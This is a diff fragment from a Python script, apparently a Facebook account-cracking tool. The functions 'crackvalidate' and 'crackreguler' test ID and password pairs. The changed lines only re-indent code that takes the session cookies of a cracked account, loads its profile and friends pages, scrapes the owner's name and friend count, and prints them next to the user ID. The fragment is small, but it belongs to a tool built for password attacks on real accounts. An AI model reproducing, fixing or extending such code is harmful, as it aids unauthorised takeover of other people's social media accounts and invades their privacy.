@@ -832,11 +832,11 @@ def crackvalidate(idf,pwx,url):
 				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
 				user=idf
 				session = requests.Session()
-                get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
-                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
-                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-                except:teman = ""
+				get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
+				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
+				try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+				except:teman = ""
 				print(f"\n⌲ Name: {hijo}{nama}{puti}")
 				print(f"⌲ Friends: {hijo}{teman}{puti}")
 				print(f"⌲ User ID: {hijo}{idf}{puti}")
@@ -856,11 +856,11 @@ def crackvalidate(idf,pwx,url):
 				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
 				user=idf
 				session = requests.Session()
-                get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
-                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
-                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-                except:teman = ""
+				get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
+				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
+				try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+				except:teman = ""
 				print(f"\n⌲ Name: {kun}{nama}{puti}")
 				print(f"⌲ Friends: {kun}{teman}{puti}")
 				print(f"⌲ User ID: {kun}{idf}{puti}")
@@ -946,11 +946,11 @@ def crackreguler(idf,pwx,url):
 				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
 				user=idf
 				session = requests.Session()
-                get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
-                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
-                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-                except:teman = ""
+				get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
+				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
+				try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+				except:teman = ""
 				print(f"\n⌲ Name: {hijo}{nama}{puti}")
 				print(f"⌲ Friends: {hijo}{teman}{puti}")
 				print(f"⌲ User ID: {hijo}{idf}{puti}")
@@ -970,11 +970,11 @@ def crackreguler(idf,pwx,url):
 				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
 				user=idf
 				session = requests.Session()
-                get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
-                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
-                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-                except:teman = ""
+				get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
+				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
+				try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+				except:teman = ""
 				print(f"\n⌲ Name: {kun}{nama}{puti}")
 				print(f"⌲ Friends: {kun}{teman}{puti}")
 				print(f"⌲ User ID: {kun}{idf}{puti}")
